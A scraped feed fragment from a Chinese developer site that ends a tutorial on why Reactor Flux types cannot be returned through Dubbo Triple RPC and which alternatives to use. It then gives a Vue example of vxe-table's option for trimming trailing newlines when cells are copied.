<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EventServiceTest</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">log</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(EventServiceTest.class);
    <span class="hljs-comment">// 👇 关键：通过 url 直连，不走注册中心</span>
    <span class="hljs-meta">@DubboReference(
            protocol = "tri",
            url = "tri://127.0.0.1:50051"  // ← 直连地址
    )</span>
    <span class="hljs-keyword">private</span> EventService eventService;

    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testDubbo</span><span class="hljs-params">()</span> {
        Flux&lt;Event&gt; eventFlux = eventService.streamRealTimeEvents();
        eventFlux
                .take(<span class="hljs-number">5</span>) <span class="hljs-comment">// 只取前5个事件</span>
                .doOnNext(data -&gt; {
                    log.info(<span class="hljs-string">"&gt;&gt; data:{}"</span>, data);
                })
                .blockLast(); <span class="hljs-comment">// 阻塞直到最后一个元素到达或流完成</span>
    }
}
</code></pre>
<p>好了，我们运行检验吧！</p>
<p>工程主要使用 spring-boot + dubbo-triple ，先启动provider工程，当出现</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c1bb29e0e234fd08550b46f7e64af7a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWFyc-mFsQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768542455&amp;x-signature=Z297irSJK0jH%2BWWCbjtExBfLXlA%3D" alt="" loading="lazy"/></p>
<p>这样的日志的时候，表示启动已经成功了。那么，我们开始流式调用吧，运行consumer中的那个单元测试，结果...</p>
<h2 data-id="heading-5">出错了</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a75ba913f97a4e7da5bb4821d945c4d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWFyc-mFsQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768542455&amp;x-signature=zkT0JlyVHR7NI8TYQ9fRczaJ%2BoA%3D" alt="" loading="lazy"/></p>
<p>运行之后，报错！错误提示说是因为 reactor.core.publisher.FluxMap 对象没有实现 Serializable 接口。</p>
<p>为什么会这样？因为<strong>RPC的传输协议中对于序列化的检查是有要求的</strong>。</p>
<p>就算我们通过配置yaml文件的序列化检查关闭掉、把包加入白名单，都是无济于事无法解决这个问题。</p>
<p>那我又想有背压，又想使用dubbo，怎么办？</p>
<h2 data-id="heading-6">完美的解决方案有吗？</h2>
<p>有！需要修改结构！</p>
<p>其实，这是一个非常典型的 <strong>“内部响应式 + 外部 RPC 同步” 架构问题</strong>。你的目标需要修改为：</p>
<ul>
<li><strong>provider 层</strong>：只传输简单 JavaBean，不暴露 Flux/Flowable；</li>
<li><strong>consumer 层</strong>：接收到 provider层的JavaBean之后，再封装为Flux/Flowable 流；</li>
<li>如果还有对外层，比如web层的controller：对外提供 Flux/Flowable 接口（例如用于 SSE、流式响应等）；</li>
</ul>
<p>总之，不应该在RPC的传输层去传输Flux/Flowable对象，RPC的接口只返回正常的POJO对象，比如：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 错误：暴露 内部类型</span>
Flux&lt;Event&gt; <span class="hljs-title function_">streamRealTimeEvents</span><span class="hljs-params">()</span>;

<span class="hljs-comment">// 正确：返回普通对象</span>
List&lt;Event&gt; <span class="hljs-title function_">listRealTimeEvents</span><span class="hljs-params">()</span>;
</code></pre>
<p>修改后的provider是这样，上码：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> List&lt;Event&gt; <span class="hljs-title function_">listRealTimeEvents</span><span class="hljs-params">()</span> {
	List&lt;Event&gt; eventList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
	<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) {
		eventList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Event</span>(<span class="hljs-string">"id-"</span> + i, <span class="hljs-string">"Hello at "</span> + System.currentTimeMillis()));
		<span class="hljs-keyword">try</span> {
			Thread.sleep(<span class="hljs-number">1000</span>); <span class="hljs-comment">// 每秒添加一个</span>
		} <span class="hljs-keyword">catch</span> (InterruptedException e) {
			Thread.currentThread().interrupt();
			<span class="hljs-keyword">break</span>;
		}
	}
	<span class="hljs-keyword">return</span> eventList;
}
</code></pre>
<p>修改后的 consumer是这样，上码：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Test</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testDubbo2</span><span class="hljs-params">()</span> {
	List&lt;Event&gt; events = eventService.listRealTimeEvents();

	<span class="hljs-comment">// 将 List 转换成 Flux 流</span>
	Flux&lt;Event&gt; eventFlux = Flux.fromIterable(events);
}
</code></pre>
<h2 data-id="heading-7">进阶理解</h2>
<p>如果你的工程像我这样，有时间上的紧密关联，那么这么做是有问题的！</p>
<p>因为provider层每秒产生一组序列号，返回给consumer层之后，有时间消耗，但是如果你的场景和时间无关的，那么上面这种方式就满足你的场景了，如果场景和时间有关，那么根据你的场景最合适的方式可能就是在consumer层去做Flux/Flowable的流处理，provider则负责处理普通crud逻辑。</p>
<p>因为 Dubbo 是 “请求-响应”模型，必须等 listRealTimeEvents() 完全执行完才能返回 List，<strong>中间过程无法实时推送给 consumer，理论上不算是真正的“实时流式传输”</strong> 。</p>
<h2 data-id="heading-8">真正的流式方案</h2>
<p>如果你<strong>必须实时推送每个 chunk</strong>（如大模型逐字输出），则 <strong>不能依赖 Dubbo 作为中间层</strong>，以下有几个建议：</p>
<h3 data-id="heading-9">建议1：绕过 Dubbo，consumer 直接流式处理</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Test</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testDubbo2</span><span class="hljs-params">()</span> {
	Flux.interval(Duration.ofSeconds(<span class="hljs-number">1</span>))
                .map(seq -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">Event</span>(<span class="hljs-string">"id-"</span> + seq, <span class="hljs-string">"Hello at "</span> + System.currentTimeMillis()));
}
</code></pre>
<p>对，你没看错，本来provider的处理逻辑直接搬到consumer层，这样做</p>
<p>优点：真正实时；<br/>
缺点：失去 Dubbo 的服务治理能力（负载均衡、熔断等）。</p>
<h3 data-id="heading-10">建议2：使用消息队列 or WebSocket 做异步通知</h3>
<ol>
<li>Dubbo 接收请求后，提交任务到 MQ；</li>
<li>异步消费 MQ，调用 Coze SDK；</li>
<li>每收到一个 chunk，通过 WebSocket/SSE 推送给前端；</li>
<li>Dubbo 接口只返回任务 ID。</li>
</ol>
<h3 data-id="heading-11">建议3：升级到支持响应式 RPC 的框架</h3>
<ul>
<li>如 gRPC + Reactor（支持 server streaming）；</li>
<li>或 Spring Cloud Gateway + WebFlux 直连后端服务。</li>
</ul>
<h2 data-id="heading-12">总结：如何选择？</h2>





















<table><thead><tr><th>需求</th><th>推荐方案</th></tr></thead><tbody><tr><td>只需最终结果</td><td>Dubbo 返回 Event 普通JavaBean，consumer 直接返回</td></tr><tr><td>需要所有事件（可接受延迟）</td><td>Dubbo 返回 List，consumer 转<code>Flowable.fromIterable()</code></td></tr><tr><td><strong>必须实时流式输出</strong></td><td><strong>consumer 直接输出</strong>（绕过 Dubbo）或改用消息推送</td></tr></tbody></table>
<h2 data-id="heading-13">最后提醒</h2>
<ul>
<li><strong>不要试图让 Flux/Flowable 穿透 Dubbo</strong> —— 这违背了 RPC 的设计原则；</li>
<li><strong>响应式编程应在单机边界内完成</strong>，跨网络用数据，不用流。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[vxe-table 复制单元格内容总会在最后加个换行符，如何去掉末尾换行符的解决方法]]></title>    <link>https://juejin.cn/post/7592882393251627051</link>    <guid>https://juejin.cn/post/7592882393251627051</guid>    <pubDate>2026-01-09T05:45:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592882393251627051" data-draft-id="7593139476832993323" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="vxe-table 复制单元格内容总会在最后加个换行符，如何去掉末尾换行符的解决方法"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2026-01-09T05:45:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户84179481456"/> <meta itemprop="url" content="https://juejin.cn/user/3921272428567529"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            vxe-table 复制单元格内容总会在最后加个换行符，如何去掉末尾换行符的解决方法
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3921272428567529/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户84179481456
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T05:45:00.000Z" title="Fri Jan 09 2026 05:45:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>vxe-table 复制单元格内容总会在最后加个换行符，如何去掉末尾换行符的解决方法，默认情况下复制单元格内容时，会自动在文本尾部带个换行符。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fvxetable.cn" target="_blank" title="https://vxetable.cn" ref="nofollow noopener noreferrer">vxetable.cn</a></p>
<p>通过 clip-config.isTrimCopyContent 来启用对复制后内容的修剪功能，自动去掉本次内容的换行符</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d1dc4d3ba75f4494881e9b42a5c7d9e0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODQxNzk0ODE0NTY=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768542300&amp;x-signature=OCAsa5t8Saz1DbRVrHA9rauYioU%3D" alt="extend_cell_area_table_clip_trim_copy_content" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">vxe-switch</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"clipConfig.isTrimCopyContent"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">vxe-switch</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">vxe-grid</span> <span class="hljs-attr">v-bind</span>=<span class="hljs-string">"gridOptions"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">vxe-grid</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { reactive } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> sexEditRender = <span class="hljs-title function_">reactive</span>({
  <span class="hljs-attr">name</span>: <span class="hljs-string">'VxeSelect'</span>,
  <span class="hljs-attr">options</span>: [
    { <span class="hljs-attr">label</span>: <span class="hljs-string">'女'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'0'</span> },
    { <span class="hljs-attr">label</span>: <span class="hljs-string">'男'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'1'</span> }
  ]
})

<span class="hljs-keyword">const</span> clipConfig = <span class="hljs-title function_">reactive</span>({
  <span class="hljs-attr">isTrimCopyContent</span>: <span class="hljs-literal">true</span> <span class="hljs-comment">// 自动去掉复制内容的首尾换行符</span>
})

<span class="hljs-keyword">const</span> gridOptions = <span class="hljs-title function_">reactive</span>({
  <span class="hljs-attr">border</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">height</span>: <span class="hljs-number">500</span>,
  <span class="hljs-attr">showOverflow</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">columnConfig</span>: {
    <span class="hljs-attr">resizable</span>: <span class="hljs-literal">true</span>
  },
  <span class="hljs-attr">mouseConfig</span>: {
    <span class="hljs-attr">area</span>: <span class="hljs-literal">true</span> <span class="hljs-comment">// 是否开启区域选取</span>
  },
  <span class="hljs-attr">areaConfig</span>: {
    <span class="hljs-attr">multiple</span>: <span class="hljs-literal">true</span> <span class="hljs-comment">// 是否启用多区域选取功能</span>
  },
  clipConfig,
  <span class="hljs-attr">editConfig</span>: {
    <span class="hljs-attr">mode</span>: <span class="hljs-string">'cell'</span>, <span class="hljs-comment">// 单元格编辑模式</span>
    <span class="hljs-attr">trigger</span>: <span class="hljs-string">'dblclick'</span> <span class="hljs-comment">// 双击单元格激活编辑状态</span>
  },
  <span class="hljs-attr">keyboardConfig</span>: {
    <span class="hljs-attr">isAll</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 是否启用快捷键全选</span>
    <span class="hljs-attr">isClip</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 是否开启复制粘贴</span>
    <span class="hljs-attr">isEdit</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 是否开启任意键进入编辑（功能键除外）</span>
    <span class="hljs-attr">isDel</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 是否开启删除键功能</span>
    <span class="hljs-attr">isEsc</span>: <span class="hljs-literal">true</span> <span class="hljs-comment">// 是否开启Esc键关闭编辑功能</span>
  },
  <span class="hljs-attr">columns</span>: [
    { <span class="hljs-attr">type</span>: <span class="hljs-string">'seq'</span>, <span class="hljs-attr">fixed</span>: <span class="hljs-string">'left'</span>, <span class="hljs-attr">width</span>: <span class="hljs-number">60</span> },
    { <span class="hljs-attr">field</span>: <span class="hljs-string">'name'</span>, <span class="hljs-attr">fixed</span>: <span class="hljs-string">'left'</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'名字'</span>, <span class="hljs-attr">editRender</span>: { <span class="hljs-attr">name</span>: <span class="hljs-string">'input'</span> } },
    { <span class="hljs-attr">field</span>: <span class="hljs-string">'role'</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'角色'</span>, <span class="hljs-attr">editRender</span>: { <span class="hljs-attr">name</span>: <span class="hljs-string">'input'</span> } },
    { <span class="hljs-attr">field</span>: <span class="hljs-string">'sex'</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'性别'</span>, <span class="hljs-attr">editRender</span>: sexEditRender },
    { <span class="hljs-attr">field</span>: <span class="hljs-string">'num'</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'分数'</span>, <span class="hljs-attr">editRender</span>: { <span class="hljs-attr">name</span>: <span class="hljs-string">'VxeNumberInput'</span> } },
    { <span class="hljs-attr">field</span>: <span class="hljs-string">'age'</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'年龄'</span>, <span class="hljs-attr">editRender</span>: { <span class="hljs-attr">name</span>: <span class="hljs-string">'VxeNumberInput'</span> } },
    { <span class="hljs-attr">field</span>: <span class="hljs-string">'address'</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'地址'</span>, <span class="hljs-attr">width</span>: <span class="hljs-number">200</span>, <span class="hljs-attr">editRender</span>: { <span class="hljs-attr">name</span>: <span class="hljs-string">'input'</span> } }
  ],
  <span class="hljs-attr">data</span>: [
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10001</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'张三'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'前端开发'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'0'</span>, <span class="hljs-attr">num</span>: <span class="hljs-number">23</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">28</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'北京市17号'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10002</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'李四'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'测试人员'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'1'</span>, <span class="hljs-attr">num</span>: <span class="hljs-number">23</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">22</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'江苏省27号'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10003</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'老六'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'项目经理'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'0'</span>, <span class="hljs-attr">num</span>: <span class="hljs-number">23</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">32</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'深圳市19号'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10004</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'小李'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'后端开发'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'1'</span>, <span class="hljs-attr">num</span>: <span class="hljs-number">456</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">24</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'江苏省47号'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10005</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'老万'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'设计师'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'1'</span>, <span class="hljs-attr">num</span>: <span class="hljs-number">23</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">42</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'北京市18号'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10006</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'小刘'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'前端开发'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'0'</span>, <span class="hljs-attr">num</span>: <span class="hljs-number">23</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">38</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'上海市17号'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10007</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'老徐'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'测试人员'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'1'</span>, <span class="hljs-attr">num</span>: <span class="hljs-number">100</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">24</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'北京市19号'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10008</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'老二'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'设计师'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'0'</span>, <span class="hljs-attr">num</span>: <span class="hljs-number">345</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">34</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'上海市11号'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10009</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'小牛'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'前端开发'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'1'</span>, <span class="hljs-attr">num</span>: <span class="hljs-number">67</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">52</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'深圳市29号'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10010</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'小帅'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'测试人员'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'1'</span>, <span class="hljs-attr">num</span>: <span class="hljs-number">23</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">44</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'北京市37号'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10011</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'老魏'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'后端开发'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'0'</span>, <span class="hljs-attr">num</span>: <span class="hljs-number">56</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">52</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'深圳市12号'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10012</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'小徐'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'测试人员'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'1'</span>, <span class="hljs-attr">num</span>: <span class="hljs-number">23</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">16</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'广州市16号'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10013</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'小张'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'设计师'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'1'</span>, <span class="hljs-attr">num</span>: <span class="hljs-number">69</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">16</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'广州市46号'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10014</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'老冯'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'前端开发'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'0'</span>, <span class="hljs-attr">num</span>: <span class="hljs-number">36</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">36</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'广州市66号'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10015</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'小哥'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'后端开发'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'0'</span>, <span class="hljs-attr">num</span>: <span class="hljs-number">33</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">47</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'广州市56号'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10016</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'李哥'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'测试人员'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'1'</span>, <span class="hljs-attr">num</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">42</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'深圳市16号'</span> }
  ]
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
